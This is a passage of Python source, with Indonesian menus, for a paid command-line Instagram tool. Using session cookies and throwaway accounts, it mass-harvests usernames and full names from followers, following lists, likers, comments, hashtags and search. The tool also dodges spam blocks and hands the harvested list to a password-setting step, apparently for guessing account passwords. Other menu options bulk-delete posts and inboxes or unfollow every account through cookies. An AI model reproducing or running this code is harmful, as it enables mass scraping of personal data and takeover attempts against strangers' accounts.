                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '06':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Link Postingan, Gunakan Koma Untuk Link Berbeda Atau Dump Masal, Misalnya :[italic green] https://www.instagram.com/p/CeIOs3kr2Cw[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    link_post = Console().input("[bold royal_blue1]   ╰─> ")
                    if 'CeIOs3kr2Cw' in str(link_post) or 'CXyPwLSJCtl' in str(link_post):
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Dump Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    for z in link_post.split(','):
                        self.media_id = Convert().Postingan(self.cookies, z)
                        Dumps().Likes(self.cookies, z, self.media_id)
                    if len(Dump) > 50:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '07':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic yellow] Device[italic white] Yang Tersedia,[italic red] Harap Pilih Salah Satu[italic white] ([italic green]Nokia,Realme,Oppo,Huawei,Xiaomi,Asus,Poco,Evercoss,Apple,LG,Samsung,Vivo,Infinix,Sony,Lenovo,OnePlus[italic white]) Misalnya :[italic green] Realme", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Pilih Device) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                device_model = Console().input("[bold royal_blue1]   ╰─> ").lower()
                open('Data/Useragent.txt', 'w').write('')
                if str(device_model) in str('Nokia,Realme,Oppo,Huawei,Xiaomi,Asus,Poco,Evercoss,Apple,LG,Samsung,Vivo,Infinix,Sony,Lenovo,OnePlus'.split(',')).lower():
                    Generate_Useragent().Scraping(device_model)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Device Yang Kamu Masukan Tidak Ada Di Dalam Daftar Pilihan!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Device Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '08':
            try:
                if self.status == 'premium':
                    Dumps().Explore(self.cookies, max_id = 0)
                    if len(Dump) > 50:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '09':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Link Postingan, Gunakan Koma Untuk Link Berbeda Atau Dump Masal, Misalnya :[italic green] https://www.instagram.com/p/CeIOs3kr2Cw[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    link_post = Console().input("[bold royal_blue1]   ╰─> ")
                    if 'CeIOs3kr2Cw' in str(link_post) or 'CXyPwLSJCtl' in str(link_post):
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Sekali Lagi Apikey Kamu Akan Di Blokir Jika Dump Akun Developer!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    for z in link_post.split(','):
                        self.media_id = Convert().Postingan(self.cookies, z)
                        Dumps().Komentar(self.cookies, z, self.media_id, '?can_support_threading=true&permalink_enabled=false')
                    if len(Dump) > 50:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '10':
            try:
                Tambahan().Lihat_Hasil_Menu()
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '11':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Hastag Atau Huruf, Gunakan Koma Untuk Hastag Berbeda Atau Dump Masal, Misalnya :[italic green] #Viral,#Indonesia,#Cantik[italic white] *Gunakan[italic red] CTRL+C[italic white] Untuk Stop!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    hastag = Console().input("[bold royal_blue1]   ╰─> ").replace('#', '').replace(' ', '')
                    for z in hastag.split(','):
                        Dumps().Hastag(self.cookies, z, page = 0, max_id = '')
                    if len(Dump) > 1:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                        Set_Password().Settingan()
                    else:
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '12':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    cookies = Console().input("[bold royal_blue1]   ╰─> ")
                    self.first_name, self.username, self.birthday = Login().My_Akun(cookies)
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Delay[italic white] Untuk Delete Semua Inbox, Gunakan Delay Di Atas[italic yellow] 60 Detik[italic white] Agar Aman, Misalnya :[italic green] 120 Detik", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    delay = int(Console().input("[bold royal_blue1]   ╰─> "))
                    if delay <= 9:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Harap Memasukan Delay Lebih Dari 60 Detik Agar Akun Aman!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Robot().Delete_Inbox(cookies, delay)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '13':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    cookies = Console().input("[bold royal_blue1]   ╰─> ")
                    self.first_name, self.username, self.birthday = Login().My_Akun(cookies)
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Delay[italic white] Untuk Unfollow Semua Username, Gunakan Delay Di Atas[italic yellow] 60 Detik[italic white] Agar Aman, Misalnya :[italic green] 120 Detik", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    delay = int(Console().input("[bold royal_blue1]   ╰─> "))
                    if delay <= 9:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Harap Memasukan Delay Lebih Dari 60 Detik Agar Akun Aman!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Robot().Unfollow(cookies, delay)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"))
                    os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '14':
            try:
                if self.status == 'premium':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan Cookie Akun Instagram Gunakan[italic green] A2F[italic white] Supaya Akun Tidak Terkena[italic red] Checkpoint[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    cookies = Console().input("[bold royal_blue1]   ╰─> ")
                    self.first_name, self.username, self.birthday = Login().My_Akun(cookies)
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Delay[italic white] Untuk Hapus Semua Postingan, Gunakan Delay Di Atas[italic yellow] 60 Detik[italic white] Agar Aman, Misalnya :[italic green] 120 Detik", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Catatan) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                    delay = int(Console().input("[bold royal_blue1]   ╰─> "))
                    if delay <= 9:
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Harap Memasukan Delay Lebih Dari 60 Detik Agar Akun Aman!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                    else:
                        Robot().Delete_Post(cookies, delay)
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Hanya Member Premium Yang Dapat Mengakses Fitur Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akses Dilarang) [bold green]<[bold yellow]<[bold red]<"));os.system('xdg-open https://wa.me/6283847921480')
                    time.sleep(3.5)
                    Menu().Utama(List = [])
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '15':
            try:
                Tambahan().Menu_Lainnya(self.cookies)
            except (Exception) as e:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '16':
            try:
                os.remove('Data/Apikey.json');os.remove('Data/Cookie.json')
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic green]Sedang Menghapus Cookies Dan Apikey Silahkan Tunggu Sebentar...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Keluar) [bold green]<[bold yellow]<[bold red]<"))
                time.sleep(2.5)
                exit()
            except (KeyboardInterrupt, Exception):
                exit()
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            Menu().Utama(List = [])

class Dumps:

    def __init__(self) -> None:
        pass

    def Pencarian_Nama(self, cookies, name):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'referer': 'https://www.instagram.com/',
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = json.loads(r.get('https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&query={}&rank_token=0.002112816830522446&include_reel=true&search_surface=web_top_search'.format(name.replace(' ', '%20')), cookies = {
                    'cookie': cookies
                }).text)
                for z in response['users']:
                    self.username, self.nama = z['user']['username'], z['user']['full_name']
                    if str(self.username) in str(Dump):
                        continue
                    else:
                        Dump.append(f'{self.username}|{self.nama}')
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                        time.sleep(0.007)
                return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) > 0:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Pengikut(self, cookies, userid, username, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'referer': 'https://www.instagram.com/{}/followers/'.format(username),
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/friendships/{}/followers/?count=100&max_id={}&search_surface=follow_list_page'.format(userid, max_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    for z in json.loads(response.text)['users']:
                        self.username, self.nama = z['username'], z['full_name']
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.username}|{self.nama}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                            time.sleep(0.0007)
                            if len(Dump) > 5000 and str(Player['Type']) == 'Trial':
                                Console().print(f"[bold royal_blue1]   ╰─>[bold red] Terkena Limit Karena Bukan Pengguna Premium!", end='\r')
                                time.sleep(6.5)
                                Console().print("                                                ", end='\r')
                                return 0
                            else:
                                continue
                    if 'next_max_id' in str(response.text):
                        self.next_max_id = json.loads(response.text)['next_max_id']
                        self.Pengikut(cookies, userid, username, max_id = self.next_max_id)
                    else:
                        return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) > 50:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (json.decoder.JSONDecodeError, KeyError) as e:
            Console().print(f"[bold royal_blue1]   ╰─>[bold red] JSONDecodeError...", end='\r')
            time.sleep(7.5)
            Console().print("                                                ", end='\r')
            if len(Dump) > 400:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Mengikuti(self, cookies, userid, username, max_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'referer': 'https://www.instagram.com/{}/following/'.format(username),
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/friendships/{}/following/?count=100&max_id={}'.format(userid, max_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif 'Please wait' in str(response.text) or 'Harap tunggu' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terkena Spam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Terkena Spam Hidupkan Mode Pesawat!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terkena Spam) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                elif '"spam":true,' in str(response.text) or '"spam": true,' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terblokir 24 Jam...", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Instagram Kamu Telah Terblokir Silahkan Ganti Akun!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Terblokir) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
                else:
                    for z in json.loads(response.text)['users']:
                        self.username, self.nama = z['username'], z['full_name']
                        if str(self.username) in str(Dump):
                            continue
                        else:
                            Dump.append(f'{self.username}|{self.nama}')
                            Console().print(f"[bold royal_blue1]   ╰─>[bold red] Dump @{str(self.username)[:20]}/{len(Dump)} Username...     ", end='\r')
                            time.sleep(0.0007)
                    if 'next_max_id' in str(response.text):
                        self.next_max_id = json.loads(response.text)['next_max_id']
                        self.Mengikuti(cookies, userid, username, max_id = self.next_max_id)
                    else:
                        return 0
        except (KeyboardInterrupt):
            Console().print("                                                             ", end='\r')
            if len(Dump) > 50:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Username Yang Terkumpul Terlalu Sedikit, Cari Target Yang Lain!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Jumlah Terlalu Sedikit) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        except (json.decoder.JSONDecodeError, KeyError) as e:
            Console().print(f"[bold royal_blue1]   ╰─>[bold red] JSONDecodeError...", end='\r')
            time.sleep(7.5)
            Console().print("                                                ", end='\r')
            if len(Dump) > 400:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Berhasil Mengumpulkan [italic green]{len(Dump)}[italic white] Username"))
                Set_Password().Settingan()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Likes(self, cookies, media_url, media_id):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'sec-fetch-dest': 'empty',
                    'accept-language': 'en-US,en;q=0.9',
                    'Host': 'www.instagram.com',
                    'sec-fetch-mode': 'cors',
                    'referer': 'https://www.instagram.com/p/{}'.format(media_url.split('https://www.instagram.com/p/')[1]),
                    'x-ig-app-id': '936619743392459',
                    'accept': '*/*',
                    'x-asbd-id': '198387',
                    'sec-fetch-site': 'same-origin',
                    'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                })
                response = r.get('https://www.instagram.com/api/v1/media/{}/likers/'.format(media_id), cookies = {
                    'cookie': cookies
                })
                if 'login_required' in str(response.text):
                    if len(Dump) > 10:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console().print("                                                ", end='\r')
                        return 0
                    else:
                        Console().print(f"[bold royal_blue1]   ╰─>[bold red] Akun Tumbal Terlogout!", end='\r')
                        time.sleep(3.5)
                        Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Sepertinya Akun Kamu Telah Terlogout Sailahkan Login Ulang!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Akun Terlogout) [bold green]<[bold yellow]<[bold red]<"))
                        exit()
